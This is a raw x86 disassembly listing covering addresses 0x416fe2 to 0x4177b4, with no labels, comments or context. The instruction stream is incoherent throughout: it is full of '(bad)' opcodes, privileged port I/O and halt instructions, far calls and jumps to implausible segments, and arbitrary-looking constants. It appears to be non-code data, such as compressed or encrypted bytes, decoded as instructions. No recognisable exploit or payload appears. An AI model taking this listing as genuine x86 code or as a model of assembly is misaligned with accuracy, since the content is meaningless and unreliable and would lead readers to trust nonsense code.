  416fe2:	add    edx,0x25
  416fe5:	or     al,0x6
  416fe7:	xchg   ebp,eax
  416fe8:	sub    dh,bh
  416fea:	or     ebx,DWORD PTR [ecx]
  416fec:	push   ecx
  416fed:	push   eax
  416fee:	or     al,BYTE PTR [esi+eiz*1-0x65]
  416ff2:	xchg   esp,eax
  416ff3:	sbb    al,0x7a
  416ff5:	clc    
  416ff6:	jb     0x416fba
  416ff8:	and    bh,ch
  416ffa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ffb:	sbb    eax,0x89007f3a
  417000:	xchg   ebp,eax
  417001:	mov    edi,0xbda4a097
  417006:	mov    edi,DWORD PTR [ebx+0x34]
  417009:	or     eax,0xc2f4ca66
  41700e:	out    0xa0,eax
  417010:	pop    ecx
  417011:	mov    edx,0x33a4213e
  417016:	loope  0x41701a
  417018:	daa    
  417019:	cmp    DWORD PTR [ebx+0x10cf6e5a],ebx
  41701f:	gs clc 
  417021:	out    dx,eax
  417022:	inc    ecx
  417023:	hlt    
  417024:	xchg   ebx,eax
  417025:	jno    0x416ff8
  417027:	aaa    
  417028:	inc    edx
  417029:	out    dx,eax
  41702a:	jge    0x41702b
  41702c:	ss mov ecx,0x55af8e5f
  417032:	push   edi
  417033:	(bad)  
  417034:	aam    0x7a
  417036:	jecxz  0x4170a1
  417038:	shl    BYTE PTR [esi-0x6a],1
  41703b:	sbb    dl,cl
  41703d:	arpl   WORD PTR ds:0xc4a8abca,bx
  417043:	mov    dl,BYTE PTR [ebx+0x41]
  417046:	(bad)  
  417047:	mov    bh,0x2f
  417049:	call   DWORD PTR [eax+0x38d04b1]
  41704f:	adc    al,0x50
  417051:	repnz inc eax
  417053:	jnp    0x417085
  417055:	adc    al,BYTE PTR [ecx+0x27]
  417058:	pop    es
  417059:	iret   
  41705a:	dec    ebx
  41705b:	and    eax,0x922845f8
  417060:	out    0xe,eax
  417062:	sub    esp,esp
  417064:	into   
  417065:	push   esi
  417066:	scas   eax,DWORD PTR es:[edi]
  417067:	in     eax,dx
  417068:	xchg   edx,eax
  417069:	jge    0x41700c
  41706b:	ret    0xa15
  41706e:	pop    es
  41706f:	jb     0x416ffe
  417071:	(bad)  [eax+0x9f3d283]
  417077:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417078:	js     0x41708d
  41707a:	dec    edi
  41707b:	and    dh,BYTE PTR [edx+0x58]
  41707e:	(bad)  
  41707f:	cmp    bh,BYTE PTR [ebx+0x5941251f]
  417085:	jg     0x41703a
  417087:	jns    0x4170f4
  417089:	dec    esi
  41708a:	xchg   ebx,edi
  41708c:	loop   0x417041
  41708e:	test   eax,0x562632f5
  417093:	bnd jae 0x41706b
  417096:	sub    eax,DWORD PTR [ecx]
  417098:	mov    ecx,0x656ee2eb
  41709d:	ins    DWORD PTR es:[edi],dx
  41709e:	mov    ah,0x81
  4170a0:	add    BYTE PTR [esi-0x32],ch
  4170a3:	mov    esp,0xb334aeda
  4170a8:	cmp    BYTE PTR [edx+0x3f],dl
  4170ab:	mov    gs,WORD PTR [ecx-0x4b8645ae]
  4170b1:	leave  
  4170b2:	push   ss
  4170b3:	fnstsw WORD PTR [esp+edi*1+0x90c9a7e]
  4170ba:	fs loopne 0x41705f
  4170bd:	int    0x76
  4170bf:	xlat   BYTE PTR ds:[ebx]
  4170c0:	mov    BYTE PTR [edi+0x37],ah
  4170c3:	fdivr  DWORD PTR [ebx+0x17020008]
  4170c9:	xor    ch,BYTE PTR [edi]
  4170cb:	dec    edx
  4170cc:	add    bl,BYTE PTR [edi+0x2ae1e60a]
  4170d2:	ss jno 0x417080
  4170d5:	adc    DWORD PTR [ecx*1-0x77e6dc36],ebp
  4170dc:	push   cs
  4170dd:	sbb    eax,DWORD PTR [edi]
  4170df:	pop    ebx
  4170e0:	fistp  QWORD PTR [ebp-0xfc5844b]
  4170e6:	call   0x3a499b94
  4170eb:	ins    DWORD PTR es:[edi],dx
  4170ec:	cmp    DWORD PTR [eax],eax
  4170ee:	inc    esi
  4170ef:	dec    edx
  4170f0:	leave  
  4170f1:	pop    ebx
  4170f2:	jecxz  0x41712b
  4170f4:	mov    esi,0x1f9ec091
  4170f9:	out    0x97,eax
  4170fb:	xchg   ebp,eax
  4170fc:	sub    esi,DWORD PTR [eax]
  4170fe:	adc    al,0x61
  417100:	mov    DWORD PTR [edx+ecx*4-0x454c6a9],esi
  417107:	outs   dx,BYTE PTR ds:[esi]
  417108:	sub    dl,BYTE PTR [esi+0x71]
  41710b:	enter  0x5006,0x5e
  41710f:	sbb    cl,BYTE PTR [eax-0x12018afb]
  417115:	je     0x4170a3
  417117:	jge    0x9a619e27
  41711d:	lahf   
  41711e:	rol    ebp,1
  417120:	inc    eax
  417121:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417122:	xor    al,0x40
  417124:	iret   
  417125:	jnp    0x4170e6
  417127:	gs xchg edx,eax
  417129:	in     al,dx
  41712a:	or     DWORD PTR [eax],esp
  41712c:	retf   
  41712d:	stos   BYTE PTR es:[edi],al
  41712e:	or     eax,edx
  417130:	add    esi,DWORD PTR [edi]
  417132:	stos   DWORD PTR es:[edi],eax
  417133:	nop
  417134:	stos   BYTE PTR es:[edi],al
  417135:	int    0xd8
  417137:	(bad)  
  417139:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41713a:	addr16 xchg edi,eax
  41713c:	mov    ebx,DWORD PTR [esi+0x4]
  41713f:	int3   
  417140:	inc    eax
  417141:	repnz adc bh,cl
  417144:	repnz ss fwait
  417147:	aas    
  417148:	arpl   WORD PTR [edi-0x339898e3],bx
  41714e:	popa   
  41714f:	and    ebp,DWORD PTR [eax-0x61e062c7]
  417155:	jge    0x41714c
  417157:	mov    bh,0x63
  417159:	mov    eax,0x9affb26c
  41715e:	inc    ebx
  41715f:	nop
  417160:	imul   ebp,ebx,0x55fc04a5
  417166:	mov    ds:0xf5d078c6,al
  41716b:	sbb    DWORD PTR [edi+0x49],0x30
  41716f:	mov    ebx,0xf9ad109a
  417174:	xor    eax,0xa3c9319c
  417179:	gs loop 0x417167
  41717c:	dec    ebx
  41717d:	dec    ecx
  41717e:	cmp    edi,edx
  417180:	jne    0x41719d
  417182:	popf   
  417183:	test   BYTE PTR ds:0xf5db534b,0xa9
  41718a:	retf   
  41718b:	es cs mov bl,0x3f
  41718f:	repnz sar BYTE PTR [ecx+0x4daa72ff],1
  417196:	and    ebp,DWORD PTR [ebx+ebp*8+0x2f9cca75]
  41719d:	out    0x4,al
  41719f:	rcl    bh,0x85
  4171a2:	std    
  4171a3:	and    esp,esp
  4171a5:	jb     0x417220
  4171a7:	ds xchg ecx,eax
  4171a9:	call   0x493a:0x63516306
  4171b0:	inc    eax
  4171b1:	hlt    
  4171b2:	outs   dx,BYTE PTR ds:[esi]
  4171b3:	ficom  WORD PTR [ebp-0x806908a]
  4171b9:	fistp  QWORD PTR [esi]
  4171bb:	jl     0x417209
  4171bd:	stc    
  4171be:	mov    cl,0xd4
  4171c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171c1:	aam    0x4f
  4171c3:	add    eax,0x41e05d54
  4171c8:	out    dx,eax
  4171c9:	not    BYTE PTR [edi+0x3a]
  4171cc:	jecxz  0x417222
  4171ce:	mov    ecx,0xddeb749f
  4171d3:	sti    
  4171d4:	adc    al,bh
  4171d6:	and    esi,DWORD PTR [edi]
  4171d8:	retf   0x36a
  4171db:	xor    DWORD PTR [ecx+0x74],edx
  4171de:	scas   eax,DWORD PTR es:[edi]
  4171df:	sub    eax,0x4f0c46e2
  4171e4:	data16 mov ch,0x40
  4171e7:	and    eax,0xd2fa2b30
  4171ec:	fwait
  4171ed:	push   ds
  4171ee:	lahf   
  4171ef:	(bad)  
  4171f0:	ja     0x4171c6
  4171f2:	call   0xc2ba:0xf3d961c3
  4171f9:	retf   
  4171fa:	scas   eax,DWORD PTR es:[edi]
  4171fb:	retf   0xd3ce
  4171fe:	clc    
  4171ff:	or     eax,0xc5e3f232
  417204:	fadd   QWORD PTR [esi-0x6d475b58]
  41720a:	cmp    BYTE PTR [edx+0x61],0xaf
  41720e:	or     eax,0xa1719f97
  417213:	mov    DWORD PTR ds:0x2cf20759,ecx
  417219:	in     eax,dx
  41721a:	nop
  41721b:	fldenv [ebp+0x3e]
  41721e:	jle    0x4171ba
  417220:	das    
  417221:	mov    bh,0x9a
  417223:	fdivr  DWORD PTR [eax-0x7fa82966]
  417229:	sbb    al,0x54
  41722b:	push   ebp
  41722c:	loopne 0x4171fe
  41722e:	and    ecx,DWORD PTR [esi]
  417230:	dec    esp
  417231:	inc    esi
  417232:	push   0x346e1b7f
  417237:	mov    DWORD PTR [eax],0xadc7208f
  41723d:	stos   BYTE PTR es:[edi],al
  41723e:	add    al,0x3e
  417240:	sub    al,BYTE PTR [eax]
  417242:	cmc    
  417243:	ror    DWORD PTR [edx],0xae
  417246:	shl    DWORD PTR [eax-0x7df3f637],1
  41724c:	sti    
  41724d:	mov    ebp,0x254bed99
  417252:	fs out 0x8,al
  417255:	mov    al,0x17
  417257:	lods   eax,DWORD PTR ds:[esi]
  417258:	int3   
  417259:	xor    esp,DWORD PTR [ebp-0x6ac1f10]
  41725f:	add    BYTE PTR [eax-0x7fb3b365],al
  417265:	les    eax,FWORD PTR [edx-0x47104172]
  41726b:	mov    eax,0xd4117c22
  417270:	pop    edx
  417271:	adc    BYTE PTR [ebp-0x567f98c2],dh
  417277:	jbe    0x41728f
  417279:	jnp    0x41727d
  41727b:	fdivrp st(7),st
  41727d:	add    ecx,esp
  41727f:	mov    ecx,0x8b8f42aa
  417284:	push   edi
  417285:	xchg   BYTE PTR [eax],cl
  417287:	scas   eax,DWORD PTR es:[edi]
  417288:	add    DWORD PTR [edi+0x41852531],edi
  41728e:	div    ecx
  417290:	ins    DWORD PTR es:[edi],dx
  417291:	enter  0x8e70,0x68
  417295:	or     BYTE PTR [ebp+0x2b6bac8b],0xd6
  41729c:	xchg   ebx,eax
  41729d:	fsubr  st(2),st
  41729f:	and    al,0x66
  4172a1:	aaa    
  4172a2:	and    eax,0x2a23bc25
  4172a7:	xlat   BYTE PTR ds:[ebx]
  4172a8:	push   edi
  4172a9:	fs (bad) 
  4172ab:	or     eax,0x381932de
  4172b0:	cwde   
  4172b1:	icebp  
  4172b2:	cmp    al,0x59
  4172b4:	adc    ch,BYTE PTR [ecx+0xa6da80a]
  4172ba:	sbb    ebp,DWORD PTR [esi]
  4172bc:	loopne 0x41729a
  4172be:	xchg   esi,eax
  4172bf:	scas   al,BYTE PTR es:[edi]
  4172c0:	ins    DWORD PTR es:[edi],dx
  4172c1:	outs   dx,BYTE PTR ds:[esi]
  4172c2:	jno    0x417250
  4172c4:	or     eax,ebp
  4172c6:	or     eax,0x5cce0d3
  4172cb:	dec    eax
  4172cc:	pop    ebx
  4172cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172ce:	daa    
  4172cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172d0:	gs in  al,0x76
  4172d3:	xor    BYTE PTR [eax],bh
  4172d5:	sub    ah,BYTE PTR [esi]
  4172d7:	shl    BYTE PTR [ecx-0x77],cl
  4172da:	jne    0x417338
  4172dc:	ins    DWORD PTR es:[edi],dx
  4172dd:	and    bl,BYTE PTR ds:0xb7737ef6
  4172e3:	xchg   ecx,eax
  4172e4:	push   edx
  4172e5:	test   al,0x4b
  4172e7:	cli    
  4172e8:	sahf   
  4172e9:	sbb    dh,al
  4172eb:	imul   edi,edx,0x2bbb6b57
  4172f1:	pop    esp
  4172f2:	ret    
  4172f3:	stos   DWORD PTR es:[edi],eax
  4172f4:	in     al,0x3
  4172f6:	call   0x94adfd04
  4172fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172fc:	ret    0x8bad
  4172ff:	iret   
  417300:	mov    DWORD PTR [edx-0x44fd6f62],ecx
  417306:	ss mov dh,0xa9
  417309:	push   0xe13922f9
  41730e:	cmp    esp,DWORD PTR [edx]
  417310:	lods   al,BYTE PTR ds:[esi]
  417311:	mov    edx,0xae0a9bb3
  417316:	or     ah,BYTE PTR [ecx]
  417318:	xor    esi,DWORD PTR [ecx+edx*2+0x33b131c7]
  41731f:	and    DWORD PTR [esi+0x71],ecx
  417322:	or     eax,0xeb7b0a62
  417327:	push   0xca73aa92
  41732c:	pop    edx
  41732d:	sub    DWORD PTR [edi],esp
  41732f:	dec    ecx
  417330:	push   ss
  417331:	out    0xa4,eax
  417333:	push   cs
  417334:	push   ss
  417335:	cmp    esp,ebx
  417337:	jge    0x417382
  417339:	lods   al,BYTE PTR ds:[esi]
  41733a:	js     0x41733f
  41733c:	add    DWORD PTR [edx-0x4dc338bf],edi
  417342:	jne    0x417310
  417344:	and    bl,ch
  417346:	popa   
  417347:	sub    al,bl
  417349:	xchg   ebp,eax
  41734a:	call   FWORD PTR [ecx-0x71]
  41734d:	fcomip st,st(7)
  41734f:	bound  ebp,QWORD PTR ds:0x12f4a40b
  417355:	jbe    0x4173bf
  417357:	jne    0x4173c0
  417359:	ins    BYTE PTR es:[edi],dx
  41735a:	mov    al,bh
  41735c:	xor    BYTE PTR [esi-0x4b38001f],0xa4
  417363:	retf   0xa018
  417366:	sar    DWORD PTR [edx-0x12],0xed
  41736a:	stos   DWORD PTR es:[edi],eax
  41736b:	or     dh,BYTE PTR [eax-0x32f81620]
  417371:	pop    ebp
  417372:	jnp    0x4173e3
  417374:	pop    eax
  417375:	xchg   DWORD PTR [edi-0x33dbd4a8],esp
  41737b:	push   ebx
  41737c:	inc    ebp
  41737d:	adc    al,0x96
  41737f:	inc    edi
  417380:	clc    
  417381:	ret    
  417382:	cmc    
  417383:	jmp    0xf81f:0x4c4c3e9
  41738a:	pop    edi
  41738b:	clc    
  41738c:	sbb    BYTE PTR [ebp-0x47cce5cd],bh
  417392:	pop    ds
  417393:	stos   BYTE PTR es:[edi],al
  417394:	sti    
  417395:	(bad)  
  417396:	push   0xffffff99
  417398:	int3   
  417399:	out    dx,eax
  41739a:	jle    0x41731e
  41739c:	pop    edi
  41739d:	pop    esp
  41739e:	and    eax,0xc4b4d8e2
  4173a3:	int3   
  4173a4:	sahf   
  4173a5:	sub    al,0xbc
  4173a8:	cld    
  4173a9:	aam    0xe4
  4173ab:	(bad)  
  4173ad:	outs   dx,BYTE PTR ds:[esi]
  4173ae:	mov    ds:0xf8d42f08,eax
  4173b3:	fild   DWORD PTR [ecx+0x3b]
  4173b6:	xchg   ebp,eax
  4173b7:	in     eax,0xa7
  4173b9:	shl    BYTE PTR [ebp+0x52],cl
  4173bc:	xchg   edi,eax
  4173bd:	into   
  4173be:	and    cl,BYTE PTR [ebx]
  4173c0:	into   
  4173c1:	sub    DWORD PTR [ebx-0x3092ee42],ecx
  4173c7:	mov    ebx,0x1b2ce19e
  4173cc:	stc    
  4173cd:	cmp    BYTE PTR [ebx],al
  4173cf:	pop    esp
  4173d0:	xchg   ebx,eax
  4173d1:	xlat   BYTE PTR ds:[ebx]
  4173d2:	in     al,dx
  4173d3:	das    
  4173d4:	xchg   esp,eax
  4173d5:	inc    ecx
  4173d6:	sub    al,0x83
  4173d8:	xlat   BYTE PTR ds:[ebx]
  4173d9:	add    bl,BYTE PTR [eax]
  4173db:	dec    eax
  4173dc:	int3   
  4173dd:	jns    0x41739b
  4173df:	sbb    ebx,DWORD PTR [edx+ebx*8-0x49dc00d6]
  4173e6:	push   es
  4173e7:	stos   BYTE PTR es:[edi],al
  4173e8:	inc    ecx
  4173e9:	or     al,0x23
  4173eb:	xchg   edx,eax
  4173ec:	aam    0x1f
  4173ee:	nop
  4173ef:	add    BYTE PTR [ecx+0x12339597],al
  4173f5:	xchg   DWORD PTR [esi-0x56],ecx
  4173f8:	push   esp
  4173f9:	sub    eax,0x587038c2
  4173fe:	lds    esp,FWORD PTR [esi-0x5f]
  417401:	mov    dl,0xc
  417403:	and    ah,0x1d
  417406:	sbb    ecx,ecx
  417408:	pop    eax
  417409:	cmp    esi,ecx
  41740b:	lahf   
  41740c:	mov    cl,0xcf
  41740e:	add    al,0x8f
  417410:	cmp    al,0x2
  417412:	add    DWORD PTR [esi-0x70],esi
  417415:	cmp    eax,esi
  417417:	nop
  417418:	ja     0x4173bf
  41741a:	sub    ebx,DWORD PTR [esi+0x25]
  41741d:	inc    edx
  41741e:	push   edx
  41741f:	push   ecx
  417420:	add    dh,BYTE PTR [ecx]
  417422:	mov    ebx,0xcaa969ac
  417427:	sbb    DWORD PTR [eax-0x4c42143d],esp
  41742d:	mov    ds:0x3f75fdcf,al
  417432:	pop    esi
  417433:	repz out dx,eax
  417435:	dec    esi
  417436:	add    eax,0x64b663bb
  41743b:	lods   al,BYTE PTR ds:[esi]
  41743c:	(bad)  [ebx]
  41743e:	or     DWORD PTR [eax-0x57b35126],0xffffff9d
  417445:	sub    BYTE PTR [ebp-0x38],bh
  417448:	in     al,dx
  417449:	out    dx,eax
  41744a:	cmp    dh,BYTE PTR [esi-0x16]
  41744d:	mov    ?,WORD PTR [edx-0x39]
  417450:	int    0xcd
  417452:	jmp    0x621c:0x8757d058
  417459:	cld    
  41745a:	sub    eax,0x436897b8
  41745f:	mov    ds:0x3d261353,eax
  417464:	je     0x417447
  417466:	dec    edi
  417467:	cmp    eax,0xbe9597f5
  41746c:	cs or  al,0xc2
  41746f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417470:	(bad)  
  417471:	in     al,0x8b
  417473:	jge    0x41742a
  417475:	ins    BYTE PTR es:[edi],dx
  417476:	adc    dh,ch
  417478:	imul   ebx,DWORD PTR [ebp+0x4f7656b4],0xb673412d
  417482:	stos   BYTE PTR es:[edi],al
  417483:	xor    eax,0x36b87b9a
  417488:	dec    ebx
  417489:	loop   0x4174cd
  41748b:	sub    DWORD PTR [edi+edx*1+0x31569751],edx
  417492:	fwait
  417493:	bt     DWORD PTR fs:[ebx-0x4],0x82
  417499:	lds    ebp,FWORD PTR [esi+0x28]
  41749c:	js     0x417471
  41749e:	inc    ebp
  41749f:	pusha  
  4174a0:	jmp    DWORD PTR [esi+0xe]
  4174a3:	cmc    
  4174a4:	push   edx
  4174a5:	mov    ch,0x62
  4174a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174a8:	ret    0xb6d4
  4174ab:	sbb    ecx,DWORD PTR [esi-0x1e]
  4174ae:	in     al,dx
  4174af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174b0:	or     DWORD PTR [esp+eiz*8-0x7410f7e8],ecx
  4174b7:	test   al,0x73
  4174b9:	enter  0xaad0,0x4b
  4174bd:	pusha  
  4174be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174bf:	jbe    0x4174d3
  4174c1:	push   cs
  4174c2:	out    0xd8,al
  4174c4:	add    dh,BYTE PTR [eax-0x54]
  4174c7:	or     al,0x81
  4174c9:	jl     0x417503
  4174cb:	pop    es
  4174cc:	mov    cl,0x82
  4174ce:	ss (bad) 
  4174d0:	xchg   esi,eax
  4174d1:	cmp    bl,BYTE PTR [esi]
  4174d3:	cdq    
  4174d4:	sbb    al,0x58
  4174d6:	add    cl,dh
  4174d8:	mov    bl,0xa6
  4174da:	xor    DWORD PTR [esi-0x300fecc1],0xffffffd2
  4174e1:	inc    esp
  4174e2:	sbb    bh,BYTE PTR [edi+edi*8-0x1d]
  4174e6:	mov    dh,BYTE PTR [edx+edi*1+0x57]
  4174ea:	ficomp WORD PTR [esi+0x3ed8a4ec]
  4174f0:	jbe    0x41755d
  4174f2:	call   0x7a1d:0x2b9b99a6
  4174f9:	pop    ss
  4174fa:	test   eax,0x39e5505c
  4174ff:	shl    DWORD PTR [edi-0x3c],1
  417502:	cli    
  417503:	aaa    
  417504:	xchg   BYTE PTR [eax],al
  417506:	jae    0x417548
  417508:	mov    al,0x41
  41750a:	push   ds
  41750b:	inc    esi
  41750c:	clc    
  41750d:	mov    edi,0x9cbc98ce
  417512:	xor    BYTE PTR [esi+0xaa4c24e],dl
  417518:	out    0x66,al
  41751a:	mov    ebx,0x9a2d64dc
  41751f:	mov    eax,ds:0xd5e3752c
  417524:	adc    ch,BYTE PTR [ebp-0x63]
  417527:	dec    esi
  417528:	push   ecx
  417529:	scas   eax,DWORD PTR es:[edi]
  41752a:	sbb    ebx,esi
  41752c:	cmp    esi,DWORD PTR [ebp-0x2a9e0bfa]
  417532:	popa   
  417533:	and    al,0xb3
  417535:	cdq    
  417536:	pop    esi
  417537:	fwait
  417538:	pop    ecx
  417539:	push   ds
  41753a:	pop    ebp
  41753b:	lock sub edi,ebx
  41753e:	(bad)  
  417540:	push   cs
  417541:	std    
  417542:	cmp    BYTE PTR [ebx],bh
  417544:	mov    DWORD PTR [ebp-0x6a],esp
  417547:	add    ecx,DWORD PTR [ecx]
  417549:	fst    QWORD PTR [ecx+0x52]
  41754c:	xor    bl,bl
  41754e:	js     0x41753d
  417550:	inc    eax
  417552:	xchg   ecx,eax
  417553:	push   ebx
  417554:	mov    cl,0xe
  417556:	ja     0x4175bc
  417558:	jb     0x4174e5
  41755a:	add    ecx,DWORD PTR [ebx]
  41755c:	fwait
  41755d:	lock mov WORD PTR [edi+0x18],cs
  417561:	ins    BYTE PTR es:[edi],dx
  417562:	lods   eax,DWORD PTR ds:[esi]
  417563:	(bad)  
  417564:	cmp    BYTE PTR [eax-0x7a],cl
  417567:	inc    esp
  417568:	mov    cl,0x47
  41756a:	mov    bh,dl
  41756c:	cmp    DWORD PTR [ecx],esi
  41756e:	ds mov cl,0x52
  417571:	or     BYTE PTR [eax+ebp*1-0x3ed418c8],al
  417578:	retf   0x3554
  41757b:	cmc    
  41757c:	scas   al,BYTE PTR es:[edi]
  41757d:	pop    ebp
  41757e:	xchg   edx,eax
  41757f:	push   eax
  417580:	ret    0x8b4f
  417583:	ss stos BYTE PTR es:[edi],al
  417585:	mov    eax,ds:0x63680eef
  41758a:	and    ebx,eax
  41758c:	adc    ah,BYTE PTR [esi-0xeaaeb97]
  417592:	dec    eax
  417593:	or     al,0x3e
  417595:	sub    esi,ecx
  417597:	cmp    eax,0x75ae2728
  41759c:	jo     0x417606
  41759e:	(bad)  
  41759f:	push   ds
  4175a0:	iret   
  4175a1:	jge    0x4175b2
  4175a3:	lea    eax,[eax+0x7b]
  4175a6:	cmp    ah,BYTE PTR fs:[ebx]
  4175a9:	out    dx,al
  4175aa:	daa    
  4175ab:	inc    edx
  4175ac:	ja     0x41752f
  4175ae:	mov    edx,0xa68929a4
  4175b3:	cs aaa 
  4175b5:	push   cs
  4175b6:	sub    eax,0x26c9d82d
  4175bb:	or     BYTE PTR [ebp-0x1fd8bc23],dh
  4175c1:	icebp  
  4175c2:	sar    BYTE PTR [esi-0x4e],1
  4175c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175c6:	shl    BYTE PTR [edx+0x1adc9e56],1
  4175cc:	xor    eax,0x132750fc
  4175d1:	pop    es
  4175d2:	cwde   
  4175d3:	rcl    edx,1
  4175d5:	ss mov dh,0x62
  4175d8:	imul   edi,DWORD PTR [ecx+edi*8-0x135e486f],0xc3faec30
  4175e3:	push   0x8e88226d
  4175e8:	sub    al,0x84
  4175ea:	xchg   ecx,eax
  4175eb:	mov    edi,0x88727b60
  4175f0:	inc    ebx
  4175f1:	fld    TBYTE PTR [ecx]
  4175f3:	(bad)  
  4175f4:	xchg   ecx,eax
  4175f5:	xchg   esi,eax
  4175f6:	and    al,0xed
  4175f8:	in     al,dx
  4175f9:	mov    esi,0x38880b3f
  4175fe:	jg     0x417610
  417600:	in     al,0x8
  417602:	dec    ebx
  417603:	inc    esp
  417604:	repnz lods al,BYTE PTR ds:[esi]
  417606:	xor    eax,0xa04877ac
  41760b:	mov    WORD PTR [eax],?
  41760d:	stc    
  41760e:	pop    edx
  41760f:	push   ecx
  417610:	adc    dh,BYTE PTR [ecx-0x80]
  417613:	cmp    DWORD PTR [edi-0x44],ecx
  417616:	test   DWORD PTR [edx-0x1e837726],esi
  41761c:	mov    ch,0x99
  41761e:	adc    eax,DWORD PTR [ecx]
  417620:	cmp    DWORD PTR [eax-0x3759d5e0],esp
  417626:	out    0x39,al
  417628:	retf   0xd77
  41762b:	iret   
  41762c:	gs sahf 
  41762e:	pop    ebx
  41762f:	dec    ecx
  417630:	std    
  417631:	cdq    
  417632:	les    ebp,FWORD PTR [ebp+0x24]
  417635:	jo     0x41768f
  417637:	test   BYTE PTR [eax-0xd],bl
  41763a:	push   edi
  41763b:	ficom  DWORD PTR [eax]
  41763d:	or     edx,DWORD PTR [edx+eax*4-0x4e]
  417641:	sbb    eax,0x9fc105b0
  417646:	cmp    BYTE PTR [edi],ah
  417648:	pop    eax
  417649:	push   es
  41764a:	push   edx
  41764b:	xchg   esi,eax
  41764c:	xchg   esp,eax
  41764d:	call   0x58f1:0xe9dfe9b1
  417654:	dec    esi
  417655:	leave  
  417656:	cmp    al,0x53
  417658:	mov    esp,0xc342ef17
  41765d:	pop    es
  41765e:	mov    es,WORD PTR [ecx]
  417660:	enter  0x3716,0x5
  417664:	repnz cwde 
  417666:	and    edx,DWORD PTR [ecx+0x11]
  417669:	mov    cl,0xc3
  41766b:	cmp    eax,0xa980a89
  417670:	gs popf 
  417672:	(bad)  
  417673:	(bad)  
  417674:	push   0x471bf49a
  417679:	cmc    
  41767a:	push   cs
  41767b:	inc    edx
  41767c:	outs   dx,DWORD PTR ds:[esi]
  41767d:	pop    es
  41767e:	dec    esp
  41767f:	push   es
  417680:	ins    DWORD PTR es:[edi],dx
  417681:	xchg   DWORD PTR [ecx-0x6274926],edi
  417687:	ret    
  417688:	mov    edx,0xa2528cb0
  41768d:	inc    ecx
  41768e:	scas   eax,DWORD PTR es:[edi]
  41768f:	cmp    edx,DWORD PTR [eax-0x2ea776aa]
  417695:	pop    ds
  417696:	fldcw  WORD PTR [esi]
  417698:	shl    ecx,0x77
  41769b:	push   cs
  41769c:	pop    edx
  41769d:	and    eax,0xe1eeacf8
  4176a2:	push   ds
  4176a3:	xor    BYTE PTR [eax+0x70555e8f],0x3a
  4176aa:	sbb    al,0x86
  4176ac:	int3   
  4176ad:	xor    cl,BYTE PTR ds:0x7f632645
  4176b3:	mov    ebp,0x938a6711
  4176b8:	xor    dl,BYTE PTR [eax-0x391b0e03]
  4176be:	std    
  4176bf:	mov    dh,0xf8
  4176c1:	jbe    0x4176b2
  4176c3:	inc    esp
  4176c4:	mov    al,0xdf
  4176c6:	mov    ebp,0x8428d53c
  4176cb:	xor    eax,0x1c29c13e
  4176d0:	mov    ch,bh
  4176d2:	sbb    dl,ah
  4176d4:	dec    eax
  4176d5:	adc    cl,al
  4176d7:	push   ebp
  4176d8:	mov    al,ds:0xcdb5e5e4
  4176dd:	fstp   DWORD PTR [ebp+0x487212be]
  4176e3:	mov    ch,BYTE PTR [eax-0x5475a8ce]
  4176e9:	pop    DWORD PTR [ebp+0x277d0464]
  4176ef:	cmp    eax,0xfd3f257d
  4176f4:	(bad)  
  4176f5:	clc    
  4176f6:	sbb    DWORD PTR [esi+0x1d],ebx
  4176f9:	mov    edi,DWORD PTR [ecx+0x4b201ff7]
  4176ff:	daa    
  417700:	rcr    BYTE PTR [ecx],0xbd
  417703:	add    esi,DWORD PTR [esi-0x36a974f1]
  417709:	mov    bl,0xe2
  41770b:	xlat   BYTE PTR ds:[ebx]
  41770c:	jns    0x4176ec
  41770e:	fidivr WORD PTR [edi+0x66]
  417711:	mov    edx,0x7fec7292
  417716:	mov    edi,DWORD PTR [ecx]
  417718:	xor    eax,0x817e2a32
  41771d:	jmp    0x80f3:0x797e9887
  417724:	mul    BYTE PTR [edi+0x279063ad]
  41772a:	ss mov eax,0x9135e0cc
  417730:	js     0x4176c6
  417732:	(bad)  
  417733:	call   0x63cc:0x3eca1cd8
  41773a:	inc    esp
  41773b:	jg     0x417700
  41773d:	inc    ebp
  41773e:	adc    ebp,DWORD PTR [esi+0x192688c0]
  417744:	test   esp,esp
  417746:	(bad)  
  417747:	mov    al,gs:0xc08c8815
  41774d:	rcl    cl,cl
  41774f:	in     al,dx
  417750:	test   eax,0xe79f0390
  417755:	aas    
  417756:	pop    esi
  417757:	hlt    
  417758:	xchg   edi,eax
  417759:	cmp    al,0x31
  41775b:	sub    eax,0x34f491cf
  417760:	cmp    esp,DWORD PTR [ebx]
  417762:	inc    edi
  417763:	in     eax,dx
  417764:	fimul  DWORD PTR [edx+0x3f895c42]
  41776a:	sub    edi,DWORD PTR [edi+0x5b]
  41776d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41776e:	into   
  41776f:	jl     0x4177ea
  417771:	dec    edx
  417772:	outs   dx,DWORD PTR ds:[esi]
  417773:	cmc    
  417774:	mov    bh,0xbc
  417776:	in     al,dx
  417777:	mov    al,0x4d
  417779:	inc    edi
  41777a:	cwde   
  41777b:	cmp    BYTE PTR [edx],cl
  41777d:	test   DWORD PTR [eax+esi*4],ebx
  417780:	mov    ebx,0x56804545
  417785:	leave  
  417786:	dec    edi
  417787:	je     0x4177f8
  417789:	push   ebp
  41778a:	cdq    
  41778b:	push   ebx
  41778c:	arpl   sp,dx
  41778e:	(bad)  
  41778f:	(bad)  
  417790:	mov    eax,0xbccc73dd
  417795:	jns    0x4177aa
  417797:	add    eax,0xdae234e5
  41779c:	cwde   
  41779d:	mov    esp,0x3c894936
  4177a2:	mov    edx,0xd0b94c3f
  4177a7:	retf   0xa2e0
  4177aa:	hlt    
  4177ab:	sbb    BYTE PTR [eax+0x14],bl
  4177ae:	ror    BYTE PTR [eax+0x4bace344],1
  4177b4:	(bad)  
